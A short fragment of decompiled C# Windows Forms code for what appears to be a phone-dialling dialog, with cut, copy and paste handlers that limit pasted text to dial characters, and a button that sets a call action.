	private void CutToolStripMenuItem_Click(object sender, EventArgs e)
	{
		TextBox1.Cut();
	}

	private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
	{
		TextBox1.Copy();
	}

	private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		string text = "0123456789,*#+";
		if (MyProject.Computer.Clipboard.ContainsText())
		{
			string text2 = MyProject.Computer.Clipboard.GetText();
			if (text2.Length <= 1500)
			{
				string text3 = text2;
				foreach (char c in text3)
				{
					if (!text.ToString().Contains(Conversions.ToString(c)))
					{
						return;
					}
				}
			}
		}
		TextBox1.Paste();
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		_Call = "call";
		base.DialogResult = DialogResult.OK;
	}
}
